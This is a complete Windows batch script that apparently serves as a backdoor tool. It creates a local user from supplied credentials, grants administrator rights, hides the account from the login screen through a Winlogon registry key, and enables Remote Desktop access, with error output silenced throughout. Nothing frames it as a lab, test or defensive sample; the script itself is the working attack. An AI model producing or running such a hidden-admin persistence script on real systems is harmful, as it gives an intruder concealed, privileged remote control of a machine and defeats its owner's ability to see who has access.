@echo off

setlocal
:: Check for username and password arguments
if "%~1"=="" (
    echo Error: Username is required as the first argument.
    exit /b 1 )
	
if "%~2"=="" (
    echo Error: Password is required as the second argument.
    exit /b 1 )

:: Set variables for username and password
set "username=%~1"
set "password=%~2"

:: Add the user with the specified password
net user "%username%" "%password%" /add >nul 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to create user %username%.
    exit /b 1 )

:: Add user to the Administrators group
net localgroup Administrators "%username%" /add >nul 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to add %username% to Administrators group.
    exit /b 1 )

:: Hide user from the login screen
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "%username%" /t REG_DWORD /d 0 /f >nul 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to hide %username% from login screen.
    exit /b 1 )

:: Add user to the Remote Desktop Users group
net localgroup "Remote Desktop Users" "%username%" /add >nul 2>&1
if %errorlevel% neq 0 (
    echo Error: Failed to add %username% to Remote Desktop Users group.
    exit /b 1 )
	
::echo User %username% created, added to Administrators and Remote Desktop Users, and hidden from login screen. endlocal exit /b 0
